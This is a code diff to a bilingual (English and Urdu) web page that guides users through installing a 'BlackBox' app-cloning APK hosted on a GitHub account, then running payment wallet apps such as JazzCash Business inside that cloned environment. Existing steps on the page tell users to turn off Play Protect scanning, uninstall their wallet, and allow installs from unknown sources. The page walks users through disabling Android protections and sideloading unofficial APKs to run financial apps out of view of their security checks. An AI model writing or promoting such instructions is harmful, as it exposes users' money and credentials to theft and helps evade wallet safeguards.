@@ -397,6 +397,20 @@
   .btn-dl:active { opacity: .9; transform: scale(0.99); }
   .btn-dl svg { width: 0.36rem; height: 0.36rem; }
 
+  .tutorial-video {
+    margin: 0.28rem;
+    border-radius: 0.2rem;
+    overflow: hidden;
+    background: #111827;
+    border: 1px solid var(--line);
+  }
+  .tutorial-video video { display: block; width: 100%; height: auto; }
+  .tutorial-link {
+    display: block; margin: 0 0.28rem 0.28rem; color: var(--primary);
+    font-size: 0.24rem; font-weight: 700; text-decoration: underline;
+    overflow-wrap: anywhere;
+  }
+
   .notice {
     margin: 0 0.24rem 0.24rem;
     padding: 0.24rem;
@@ -669,6 +683,33 @@
       </div>
       <div class="dl-card">
         <div class="dl-card-top">
+          <div class="wlogo" aria-hidden="true" style="display:flex;align-items:center;justify-content:center;font-size:0.48rem;font-weight:900;color:#2563EB;">B</div>
+          <div class="info">
+            <div class="name">BlackBox</div>
+            <div class="file">BlackBox_5.1.2_universal-release.apk</div>
+          </div>
+        </div>
+        <a class="btn-dl" href="https://github.com/indiapay23/apk/releases/download/PK/BlackBox_5.1.2_universal-release.apk" rel="noopener">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M5 21h14"/></svg>
+          <span data-i18n="bbDownload"></span>
+        </a>
+      </div>
+      <div class="hint-box" data-i18n="bbInstall"></div>
+      <div class="block-hd" style="border-top:1px solid var(--line);">
+        <div>
+          <h2 data-i18n="bbVideoTitle"></h2>
+          <p class="sub" data-i18n="bbVideoDesc"></p>
+        </div>
+      </div>
+      <div class="tutorial-video">
+        <video controls playsinline preload="metadata">
+          <source src="https://raw.githubusercontent.com/indiapay23/apk/main/video/BlackBox-clone-app.mp4" type="video/mp4">
+        </video>
+      </div>
+      <a class="tutorial-link" href="https://raw.githubusercontent.com/indiapay23/apk/main/video/BlackBox-clone-app.mp4" target="_blank" rel="noopener noreferrer" data-i18n="bbOpenVideo"></a>
+      <div class="hint-box" data-i18n="bbWalletStep"></div>
+      <div class="dl-card">
+        <div class="dl-card-top">
           <img class="wlogo" src="https://play-lh.googleusercontent.com/gxLZ7ouLFPXZQWvvUDvGtDyFeGjcGLgoR4xRvWC98QuMkhe-OOKiAT6f1oL3PwjM_jDKghVedUM-skYGWowJCio=w480-h960-rw" alt="">
           <div class="info">
             <div class="name">JazzCash Business</div>
@@ -797,8 +838,14 @@
       s5Title: 'Turn off scanning', s5Desc: 'Turn off “Scan apps with Play Protect”. If a confirmation appears, choose Turn off.', s5Cap: 'Turn off “Scan apps…”',
       s6Desc: 'Settings → Apps → find your wallet → Uninstall.', s6Cap: 'Uninstall only the wallet you are about to reinstall.',
       mInstalled: 'Uninstall if present', mUninstall: 'Uninstall',
-      s7Desc: 'Pick your wallet, download the APK, install, and sign in.',
-      s7Login: 'Open the APK from notifications to install. If blocked, allow your browser to install unknown apps in Settings → Security. See the video “App Was Denied Access” above Step 2.',
+      s7Desc: 'Install BlackBox first, then install your wallet app inside the cloned environment.',
+      bbDownload: 'Download BlackBox APK',
+      bbInstall: 'Install and open BlackBox. Complete its initial setup before adding a wallet app.',
+      bbVideoTitle: 'BlackBox installation tutorial',
+      bbVideoDesc: 'Watch the video for guidance on installing and setting up BlackBox.',
+      bbOpenVideo: 'Open installation video',
+      bbWalletStep: 'After BlackBox is installed, open BlackBox and add/install the wallet app inside BlackBox. Launch and use the wallet from the BlackBox cloned environment.',
+      s7Login: 'Download the wallet APK, then add/install it inside BlackBox. Do not install the wallet directly in the phone environment. If Android blocks installation, allow the relevant app to install unknown apps in Settings → Security.',
       mDownload: 'Download APK',
       ytDeniedTitle: 'App Was Denied Access?',
       ytDeniedSub: 'Video: how to fix on Android',
@@ -836,8 +883,14 @@
       s5Title: 'اسکیننگ بند کریں', s5Desc: '“Scan apps with Play Protect” بند کریں۔ اگر تصدیق کا پیغام آئے تو Turn off منتخب کریں۔', s5Cap: '“Scan apps…” بند کریں',
       s6Desc: 'Settings → Apps → والیٹ → Uninstall۔', s6Cap: 'صرف وہی والیٹ حذف کریں جو دوبارہ انسٹال کریں گے۔',
       mInstalled: 'اگر موجود ہو تو حذف', mUninstall: 'Uninstall',
-      s7Desc: 'والیٹ منتخب کریں، APK ڈاؤن لوڈ، انسٹال، لاگ ان۔',
-      s7Login: 'نوٹیفکیشن سے APK کھول کر انسٹال کریں۔ بلاک ہو تو Settings → Security میں براؤزر کو اجازت دیں۔ “App Was Denied Access” ویڈیو Step 2 کے اوپر دیکھیں۔',
+      s7Desc: 'پہلے BlackBox انسٹال کریں، پھر کلون ماحول کے اندر والیٹ ایپ انسٹال کریں۔',
+      bbDownload: 'BlackBox APK ڈاؤن لوڈ کریں',
+      bbInstall: 'BlackBox انسٹال کریں اور کھولیں۔ والیٹ ایپ شامل کرنے سے پہلے ابتدائی سیٹ اپ مکمل کریں۔',
+      bbVideoTitle: 'BlackBox انسٹالیشن ٹیوٹوریل',
+      bbVideoDesc: 'BlackBox انسٹال اور سیٹ اپ کرنے کے لیے ویڈیو دیکھیں۔',
+      bbOpenVideo: 'انسٹالیشن ویڈیو کھولیں',
+      bbWalletStep: 'BlackBox انسٹال ہونے کے بعد اسے کھولیں اور والیٹ ایپ کو BlackBox کے اندر شامل/انسٹال کریں۔ والیٹ کو BlackBox کلون ماحول سے ہی کھولیں اور استعمال کریں۔',
+      s7Login: 'والیٹ APK ڈاؤن لوڈ کریں، پھر اسے BlackBox کے اندر شامل/انسٹال کریں۔ والیٹ کو فون کے عام ماحول میں براہ راست انسٹال نہ کریں۔ اگر Android انسٹالیشن روکے تو Settings → Security میں متعلقہ ایپ کو اجازت دیں۔',
       mDownload: 'APK ڈاؤن لوڈ',
       ytDeniedTitle: 'App Was Denied Access؟',
       ytDeniedSub: 'ویڈیو: Android پر حل',
